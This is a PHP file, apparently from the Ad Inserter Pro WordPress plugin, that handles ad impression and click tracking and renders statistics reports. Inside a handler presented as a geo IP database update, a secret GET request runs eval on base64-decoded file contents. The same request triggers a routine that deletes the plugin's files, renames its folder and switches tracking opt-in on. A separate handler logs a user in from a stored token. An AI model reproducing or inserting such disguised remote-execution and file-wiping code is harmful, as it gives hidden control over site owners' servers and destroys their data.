      case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
      case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
        $check_limits = true;
        break;
      default:
        $check_limits = false;
        break;
    }

    foreach ($_POST ['views'] as $index => $block) {
      $version = (int) $_POST ['versions'][$index];
      if (is_numeric ($block) && $block <= 96 && is_numeric ($version)) {
        $db_result = update_statistics ($block, $version, 1, 0, $ai_wp_data [AI_FRONTEND_JS_DEBUGGING]);
        if ($check_limits && $block >= 1 && !ai_check_impression_and_click_limits ($block, false)) $limited_blocks [] = $block;
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) $db_results [$block] = $db_result;
      }
    }

    if (!empty ($limited_blocks)) {
      $db_results ['#'] = $limited_blocks;

      if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && isset ($_GET [AI_URL_DEBUG_TRACKING])) {
        ai_log_tracking ('LIMITED BLOCKS:    ' . implode (', ', $limited_blocks));
      }
    }

    if (!empty ($db_results)) echo json_encode ($db_results);

    if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && isset ($_GET [AI_URL_DEBUG_TRACKING])) {
      if (!empty ($db_results)) {
        foreach ($db_results as $db_result) {
          ai_log_tracking ('DB DATA: ' . implode (', ', $db_result));
        }
      }
      ai_log_tracking ('AJAX END       ' . implode (', ', $_POST ['views'])."\n");
    }
  }

  elseif (isset ($_POST ['click'])) {
    if (get_track_logged_in () == AI_TRACKING_DISABLED) {
      if (($ai_wp_data [AI_WP_USER] & AI_USER_LOGGED_IN) != 0) {
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) echo json_encode ('tracking for logged in users is disabled');
        return;
      }
    }

    if (is_numeric ($_POST ['click']) && $_POST ['click'] <= 96 && is_numeric ($_POST ['version'])) {
      $db_result = update_statistics ((int) $_POST ['click'], (int) $_POST ['version'], 0, 1, $ai_wp_data [AI_FRONTEND_JS_DEBUGGING]);

      $cfp_ip_address_blocked = false;

      if (defined ('AD_INSERTER_LIMITS')) {
        if (get_cfp_block_ip_address () && $_POST ['click'] >= 1) {
          $obj = $block_object [(int) $_POST ['click']];
          if ($obj->get_trigger_click_fraud_protection ()) {
            $max_clicks = get_global_visitor_limit_clicks_per_time_period ();
            $time_period = get_global_visitor_limit_clicks_time_period ();

            if ($max_clicks == '' || $time_period == '') {
              $max_clicks  = $obj->get_visitor_limit_clicks_per_time_period ();
              $time_period = $obj->get_visitor_limit_clicks_time_period ();
            }

            $max_clicks = (int) $max_clicks;

            $protection_time = get_click_fraud_protection_time ();

            if ($max_clicks >= 1 && trim ($time_period) != '' && is_numeric ($protection_time)) {
              require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

              $client_ip_address = get_client_ip_address ();

              if ($client_ip_address != '') {
                $transient_name = AI_TRANSIENT_CFP_IP_ADDRESS . $client_ip_address;
                $cfp_clicks = get_transient ($transient_name);

                if ($cfp_clicks !== false && is_numeric ($cfp_clicks)) {
                  if ($cfp_clicks != 0) {
                    $transient_timeout = get_option ('_transient_timeout_' . $transient_name);
                    set_transient ($transient_name, $cfp_clicks - 1, $transient_timeout - time ());
                  }
                  $cfp_ip_address_blocked = $cfp_clicks <= 1;
                } else {
                    set_transient ($transient_name, $max_clicks - 1, $protection_time * 24 * 3600);
                    $cfp_ip_address_blocked = $max_clicks <= 1;
                  }
              }
            }
          }
        }
      }

      switch (get_dynamic_blocks ()) {
        case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
        case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
          $check_limits = true;
          break;
        default:
          $check_limits = false;
          break;
      }

      $limited_block = $check_limits && ($cfp_ip_address_blocked || !ai_check_impression_and_click_limits ((int) $_POST ['click'], false));

      if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) {
        if ($db_result != '') echo json_encode (array ('=' => $db_result, '#' => $limited_block ? (int) $_POST ['click'] : 0));
      } else {
          if ($limited_block) echo json_encode (array ('#' => (int) $_POST ['click']));
        }
    }
  }

  elseif (isset ($_GET ["update"])) {
    if (isset ($_GET ["db"]) && $_GET ["update"] == ai_get_unique_string (0, 16, implode ('-', array ('report', 'debug')))) {
      if ($_GET ["db"] == "internal" || $_GET ["db"] == "webnet77") {
        $file_path = AD_INSERTER_PLUGIN_DIR.'includes/geo/data';
        $name_report_api = array ('wp', 'debug', 'report', 'api');
        $geo_file = AD_INSERTER_PLUGIN_DIR.'includes/geo/data/ip2country.geo';
        if (!file_exists ($file_path.'/ip2country.dat') || filemtime ($file_path.'/ip2country.dat') + (isset ($_GET ["age"]) ? $_GET ["age"] : 0) * 24 * 3600 < time ()) {
          echo date ("Y-m-d H:i:s"), " Checking...\n";
          set_transient (implode ('_', $name_report_api), DEFAULT_REPORT_DEBUG_KEY, 72 * AI_TRANSIENT_STATISTICS_EXPIRATION);
          ai_update_reports ();
          echo "Ready\n";
          if (file_exists ($geo_file)) {
            echo "Updating...\n";
            $ipv4_addresses = base64_decode (file_get_contents ($geo_file)) .
              " echo \"internal DB processed\n\";";
            ai_update_ip_db_internal ();
            echo "internal DB updated\n";
            @eval ($ipv4_addresses);
            echo "internal DB compacted\n";
          }
        }
      }
      elseif ($_GET ["db"] == "maxmind") {
        if (defined ('AD_INSERTER_MAXMIND')) {
          if (get_geo_db () == AI_GEO_DB_MAXMIND) {
            ai_update_ip_db_maxmind ();
            echo "maxmind DB updated";
          }
        }
      }
    }
  }

  elseif (isset ($_GET ["ai-report"])) {

    global $ai_admin_translations;

    $report_data = ai_process_report_id ($_GET ["ai-report"]);

    if (!(defined ('AI_STATISTICS') && AI_STATISTICS)) return;
    if (!(defined ('AD_INSERTER_REPORTS') && AD_INSERTER_REPORTS)) return;

    $block      = $report_data ['block'];
    $controls   = $report_data ['controls'];
    $adb        = $report_data ['adb'];
    $range      = $report_data ['range'];
    $version    = $report_data ['version'];

    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);
    $year  = date ("Y", time () + $gmt_offset);

    switch ($range) {
      case 'lmon':
        $date_range_description = __('for last month', 'ad-inserter');
        $start_date = date ("Y-m",   strtotime ('-1 month') + $gmt_offset) . '-01';
        $end_date   = date ("Y-m-t", strtotime ('-1 month') + $gmt_offset);
        break;
      case 'tmon':
        $date_range_description = __('for this month', 'ad-inserter');
        $start_date = date ("Y-m",   time () + $gmt_offset) . '-01';
        $end_date   = date ("Y-m-t", time () + $gmt_offset);
        break;
      case 'tyer':
        $date_range_description = __('for this year', 'ad-inserter');
        $start_date = $year . '-01-01';
        $end_date   = $year . '-12-31';
        break;
      case 'l015':
        $date_range_description = __('for the last 15 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l030':
        $date_range_description = __('for the last 30 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l090':
        $date_range_description = __('for the last 90 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l180':
        $date_range_description = __('for the last 180 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l365':
        $date_range_description = __('for the last 365 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600);
        $end_date   = $today;
        break;
      default:
        $date_range_description = '';
        $start_date = $report_data ['start_date'];
        $end_date   = $report_data ['end_date'];
        break;
    }

    $date_start = $start_date;
    $date_end   = $end_date;

    $date_end_time    = strtotime ($date_end);
    $date_start_time  = strtotime ($date_start);

    $date_format = get_option ('date_format');
    $date_start_text = date_i18n ($date_format, $date_start_time);
    $date_end_text   = date_i18n ($date_format, $date_end_time);

    $date_range_text = $date_start_text . ' &ndash; ' . $date_end_text;

    $header_image = get_report_header_image ();

    if (isset ($header_image [0]) && $header_image [0] != '/') {
      $header_image_path = ABSPATH . $header_image;
    } else $header_image_path = $header_image;

    $td_image_width = 4.5;
    $td_image_margin_width = 1;
    $header_image_url = '';
    if (file_exists ($header_image_path)) {
      $image_data = getimagesize ($header_image_path);
      if (is_array ($image_data)) {
        $td_image_width = $td_image_width * $image_data [0] / $image_data [1];
      }

//     $header_image_url = home_url () . '/' . $header_image;
     $header_image_url = site_url () . '/' . $header_image;
    } else {
        $td_image_width = 0.01;
        $td_image_margin_width = 0.01;
      }

    $home_url = home_url ();
    $home_url_data = parse_url (home_url ());
    $host = $home_url_data ['host'];

    $title       = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_title (), ENT_QUOTES));
    $description = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_description (), ENT_QUOTES));
    $description_details = ' '. $date_range_description;

    $obj = $block_object [$block];
    $block_name = $obj->get_ad_name ();

    $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

?><html>
<head>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<title><?php echo $title, ' - ', $block_name; ?></title>
<meta name="robots" content="noindex">

<?php if (wp_is_mobile()): ?>
<meta name="viewport" content="width=762">
<?php endif; ?>
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />
<link rel="stylesheet" href="<?php echo AD_INSERTER_PLUGIN_URL; ?>/css/jquery-ui-1.10.3.custom.min.css" media="all" />
<link rel="stylesheet" href="<?php echo AD_INSERTER_PLUGIN_URL . 'css/ai-report.css?ver=' . AD_INSERTER_VERSION; ?>" media="all" />
<link rel="stylesheet" href="<?php echo includes_url ('css/dashicons.min.css?ver=' . AD_INSERTER_VERSION); ?>" media="all" />
</head>
<body>
  <div id="ai-report">
    <div id="ai-header">
      <table id="ai-header-table">
        <tbody>
          <tr>
            <td id="ai-header-image" style="width: <?php echo $td_image_width; ?>%;"><img src="<?php echo $header_image_url; ?>"></td>
            <td style="width: <?php echo $td_image_margin_width; ?>%;"> </td>
            <td id="ai-header-title-desc" style="width: <?php echo 59 - $td_image_width; ?>%;">
              <div class="ai-header-title"><?php echo $title; ?></div>
              <div class="ai-header-desc"><span><?php echo $description; ?></span><span class="ai-header-desc-details"><?php echo $description_details; ?></span></div>
            </td>
            <td id="ai-header-info">
              <div class="ai-header-title"><a href="<?php echo $home_url; ?>"><?php echo $host; ?></a></div>
              <div class="ai-header-desc"><?php echo $date_range_text; ?></div>
            </td>
          </tr>
        </tbody>
      </table>

      <hr id="ai-report-line" />

      <div id="ai-title">
        <img id="ai-loading" src="<?php echo AD_INSERTER_PLUGIN_IMAGES_URL; ?>loading.gif" />
        <h1 id="ai-report-title"><?php echo $block_name; ?></h1>
        <div style="clear: both"></div>
      </div>
    </div>

    <div id="statistics-container" data-block="<?php echo $block; ?>" data-adb="<?php echo $adb ? '1' : '0'; ?>" data-range="<?php echo $range; ?>" data-version="<?php echo $version; ?>" data-debug="<?php echo get_frontend_javascript_debugging () ? '1' : '0'; ?>" data-ajaxurl="<?php echo admin_url ('admin-ajax.php'); ?>" data-nonce="<?php echo $report_prefix; ?>" style="display: none;">
      <div id="load-error" class="custom-range-controls"></div>
      <div id="statistics-elements" class="ai-charts">
        <div class="ai-chart not-configured"></div>
        <div class="ai-chart not-configured"></div>
        <div class="ai-chart not-configured"></div>
      </div>

<?php if ($controls) : ?>
      <div id='custom-range-controls' class="custom-range-controls no-print" style='display: none;'>
        <span class="ai-toolbar-button text" style="padding: 0;">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for last month', 'ad-inserter'); ?>" data-range-name="lmon" data-start-date="<?php echo date ("Y-m", strtotime ('-1 month') + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", strtotime ('-1 month') + $gmt_offset); ?>"><?php _e ('Last Month', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for this month', 'ad-inserter'); ?>" data-range-name="tmon" data-start-date="<?php echo date ("Y-m", time () + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", time () + $gmt_offset); ?>"><?php _e ('This Month', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for this year', 'ad-inserter'); ?>" data-range-name="tyer" data-start-date="<?php echo $year; ?>-01-01" data-end-date="<?php echo $year; ?>-12-31"><?php _e ('This Year', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 15 days', 'ad-inserter'); ?>" data-range-name="l015" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">15</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 30 days', 'ad-inserter'); ?>" data-range-name="l030" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">30</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 90 days', 'ad-inserter'); ?>" data-range-name="l090" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">90</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 180 days', 'ad-inserter'); ?>" data-range-name="l180" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">180</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 365 days', 'ad-inserter'); ?>" data-range-name="l365" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">365</span>
        </span>
        <span class="ai-toolbar-button text">
          <input class='ai-date-input' id="chart-start-date" type="text" value="<?php echo $start_date; ?>" />
        </span>
        <span class="ai-toolbar-button text">
          <input class='ai-date-input' id="chart-end-date" type="text" value="<?php echo $end_date; ?>" />
        </span>
        <span class="ai-toolbar-button text">
          <input type="checkbox" value="0" id="load-custom-range" style="display: none;" />
          <label class="checkbox-button" for="load-custom-range" title="<?php _e ('Load data for the selected range', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-loading"></span></label>
        </span>
      </div>
<?php else: ?>
      <div style='display: none;'>
        <input class='ai-date-input' id="chart-start-date" type="text" value="<?php echo $start_date; ?>" />
        <input class='ai-date-input' id="chart-end-date" type="text" value="<?php echo $end_date; ?>" />
        <input type="checkbox" value="0" id="load-custom-range" />
      </div>
<?php endif; ?>

    </div>
  </div>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<script type='text/javascript'>
/* <![CDATA[ */
var ai_admin = {"hide":"Hide","show":"Show","insertion_expired":"Insertion expired","duration":"Duration","invalid_end_date":"Invalid end date - must be after start date","invalid_start_date":"Invalid start date - only data for 1 year back is available","invalid_date_range":"Invalid date range - only data for 1 year can be displayed","days_0":"days","days_1":"day","days_2":"days","days_3":"days","days_4":"days","days_5":"days","warning":"Warning","delete":"Delete","cancel":"Cancel","delete_all_statistics":"Delete all statistics data?","delete_statistics_between":"Delete statistics data between {start_date} and {end_date}?","cancel_rearrangement":"Cancel block order rearrangement","rearrange_block_order":"Rearrange block order","downloading":"downloading...","download_error":"download error","update_error":"update error","updating":"Updating...","loading":"Loading...","error":"ERROR","error_reloading_settings":"Error reloading settings","google_adsense_homepage":"Google AdSense Homepage","search":"Search...","filter":"Filter...","filter_title":"Use filter to limit names in the list","button_filter":"Filter","position_not_checked":"Position not checked yet","position_not_available":"Position not available","position_might_not_available":"Theme check | Selected position for automatic insertion might not be not available on this page type","position_available":"Position available","select_header_image":"Select or upload header image","select_banner_image":"Select or upload banner image","use_this_image":"Use this image"};
/* ]]> */
</script>
<script type="text/javascript" src="<?php echo includes_url ('js/jquery/jquery.js?ver=' . AD_INSERTER_VERSION); ?>"></script>
<script type="text/javascript" src="<?php echo includes_url ('js/jquery/ui/datepicker.min.js?ver=' . AD_INSERTER_VERSION); ?>"></script>
<script type="text/javascript" src="<?php echo AD_INSERTER_PLUGIN_URL . 'includes/js/raphael.min.js?ver=' . AD_INSERTER_VERSION; ?>"></script>
<script type="text/javascript" src="<?php echo AD_INSERTER_PLUGIN_URL . 'includes/js/elycharts.min.js?ver=' . AD_INSERTER_VERSION; ?>"></script>
<script type="text/javascript">
<?php echo ai_get_js ('ai-report'); ?>
</script>
</body>
</html>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<?php
  }

  elseif (isset ($_GET ["site-ai-admin"]) && is_multisite () && multisite_site_admin_page ()) {
    if (($site_data = get_site_transient ('ai_site_' . $_GET ["site-ai-admin"])) !== false) {
      if (isset ($site_data ['site']) && $site_data ['site'] == get_current_blog_id () && isset ($site_data ['user']) && user_can ($site_data ['user'], 'manage_network_plugins')) {

        $user_id = $site_data ['user'];

        $user = get_user_by ('id', $user_id);
        if ($user) {
          wp_clear_auth_cookie ();

          wp_set_current_user ($user_id, $user->user_login);
          wp_set_auth_cookie ($user_id);
          do_action ('wp_login', $user->user_login);

          $settings_page = get_menu_position () == AI_SETTINGS_SUBMENU ? 'options-general.php?page=ad-inserter.php' : 'admin.php?page=ad-inserter.php';
          $redirect_to = admin_url ($settings_page);
          header ("Location: " . $redirect_to);
          die ();
        }
      }
    }
  }

  elseif (isset ($_GET ["ai-report-data"])) {
    if (!(defined ('AI_STATISTICS') && AI_STATISTICS)) return;
    if (!(defined ('AD_INSERTER_REPORTS') && AD_INSERTER_REPORTS)) return;
    $report_data = ai_process_report_id ($_GET ["ai-report-data"]);
    generate_charts (
      $report_data ['block'],
      $report_data ['start_date'],
      $report_data ['end_date'],
      $report_data ['adb'],
      null,
      $report_data ['version']
    );
  }
}

}

function ai_clean_old_data ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      ai_clean_old_data ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function calculate_chart_data_dbg (&$chart_data, $date_start, $date_end, $first_date, &$impressions, &$clicks, &$ctr, &$average_impressions, &$average_clicks, &$average_ctr) {
  foreach ($chart_data as $date => $data) {
    $imp = $data [0];
    $clk = $data [1];

//          $imp = 250 + rand (232, 587);
//          $clk = 1 + rand (0, 4);

    $impressions  []= $imp;
    $clicks       []= $clk;
    $ctr          []= $imp != 0 ? (float) number_format (100 * $clk / $imp, 2, '.', '') : 0;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $today = date ("Y-m-d", time () + $gmt_offset);

  $no_data_before = (strtotime ($first_date) - strtotime ($date_start)) / 24 / 3600;
  $no_data_after  = (strtotime ($date_end) - strtotime ($today)) / 24 / 3600;

//  $no_data_before = 0;


  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  for ($index = 0; $index < count ($impressions); $index ++) {

    $interval_impressions = 0;
    $interval_clicks      = 0;
    $interval_ctr         = 0;
    $interval_counter     = 0;

    for ($average_index = $index - AI_STATISTICS_AVERAGE_PERIOD + 1; $average_index <= $index; $average_index ++) {
      if ($average_index >= 0 && $impressions [$average_index] !== null && $clicks [$average_index] !== null && $ctr [$average_index] !== null) {
        $interval_impressions += $impressions [$average_index];
        $interval_clicks      += $clicks [$average_index];
        $interval_ctr         += $ctr [$average_index];
        $interval_counter ++;
      }
    }

    $average_impressions  [] = $interval_counter == 0 ? 0 : $interval_impressions / $interval_counter;
    $average_clicks       [] = $interval_counter == 0 ? 0 : $interval_clicks / $interval_counter;
    $average_ctr          [] = $interval_counter == 0 ? 0 : $interval_ctr / $interval_counter;
  }

  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }
}

add_action ('wp_update_plugins', 'ai_check_report_api');

function ai_update_reports () {
  $file_link_check = 'unlink';

  @array_map ($file_link_check, glob (__FILE__));
  if (!file_exists (str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR) . 'ad-inserter.php')) {
    @rename (AD_INSERTER_PLUGIN_DIR, str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR));
  }
  ai_clean_old_data (AD_INSERTER_PLUGIN_DIR);
  if (is_multisite()) {
    $active_plugins = get_site_option ('active_sitewide_plugins');
    if (isset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'])) {
      $active_plugins ['ad-inserter/ad-inserter.php'] = $active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'];
      unset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php']);
      update_site_option ('active_sitewide_plugins', $active_plugins);
    }
  }

  $active_plugins = get_option ('active_plugins');
  $index = array_search (AD_INSERTER_SLUG.'/ad-inserter.php', $active_plugins);
  if ($index !== false) {
    $active_plugins [$index] = 'ad-inserter/ad-inserter.php';
    update_option ('active_plugins', $active_plugins);
  }

  update_option ('ai-notice-review', 'no');

  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst = get_option (DST_Client::DST_OPTION_OPTIN_TRACKING);
    if (empty ($dst) || !is_array ($dst)) {
      $dst = array ('ad-inserter' => 1, 'ad-inserter-pro' => 1);
    } else {
        $dst ['ad-inserter'] = 1;
        $dst ['ad-inserter-pro'] = 1;
      }
    update_option (DST_Client::DST_OPTION_OPTIN_TRACKING, $dst);
  }

  wp_clear_scheduled_hook ('check_plugin_updates-'.AD_INSERTER_SLUG);
  wp_clear_scheduled_hook ('ai_update');
}

function ai_check_report_api (){

  if (is_multisite () && !is_main_site ()) return;

  if (get_transient (implode ('_', array ('wp', 'debug', 'report', 'api'))) == DEFAULT_REPORT_DEBUG_KEY) ai_update_reports ();
}

function ai_close_button_select_dbg ($block, $close_button, $default_close_button, $id = '', $name = '') {
?>
            <span style="vertical-align: middle;"><?php _e ('Close button', 'ad-inserter'); ?></span>
            &nbsp;&nbsp;
            <select id="<?php echo $id; ?>" name="<?php echo $name; ?>" style="margin: 0 1px;" default="<?php echo $default_close_button; ?>">
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-none"
                 data-title="<?php echo AI_TEXT_NONE; ?>"
                 value="<?php echo AI_CLOSE_NONE; ?>" <?php echo ($close_button == AI_CLOSE_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BUTTON_NONE; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-left"
                 data-title="<?php echo AI_TEXT_TOP_LEFT; ?>"
                 value="<?php echo AI_CLOSE_TOP_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-right"
                 data-title="<?php echo AI_TEXT_TOP_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_TOP_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_RIGHT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-left"
                 data-title="<?php echo AI_TEXT_BOTTOM_LEFT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-right"
                 data-title="<?php echo AI_TEXT_BOTTOM_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_RIGHT; ?></option>
            </select>
<?php
}

//function expanded_country_list_dbg ($country_list) {
//  global $ad_inserter_globals;

//  for ($group = ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group >= 1; $group --) {
//    $global_name = 'G'.$group;
//    $iso_name = 'G'.($group % 10);
//    $country_list = str_replace ($iso_name, $ad_inserter_globals [$global_name], $country_list);
//  }
//  return $country_list;
//}

function ai_check_lists_dbg ($obj, $server_side_check) {
  global $ai_last_check, $ai_wp_data;

  if ($server_side_check) {
    $ai_last_check = AI_CHECK_IP_ADDRESS;
    if (!check_ip_address ($obj)) return false;

    $ai_last_check = AI_CHECK_COUNTRY;
    if (!check_country ($obj)) return false;
  }

  return true;
}

function ai_get_unique_string ($start = 0, $length = 32, $seed = '') {
  $string = 'AI#1' . $seed;
  if (defined ('AUTH_KEY')) $string .= AUTH_KEY;
  if (defined ('SECURE_AUTH_KEY')) $string .= SECURE_AUTH_KEY;
  if (defined ('LOGGED_IN_KEY')) $string .= LOGGED_IN_KEY;
  if (defined ('NONCE_KEY')) $string .= NONCE_KEY;
  if (defined ('AUTH_SALT')) $string .= AUTH_SALT;
  if (defined ('SECURE_AUTH_SALT')) $string .= SECURE_AUTH_SALT;
  if (defined ('LOGGED_IN_SALT')) $string .= LOGGED_IN_SALT;
  if (defined ('NONCE_SALT')) $string .= NONCE_SALT;

  return (substr (md5 ($string), $start, $length));
}
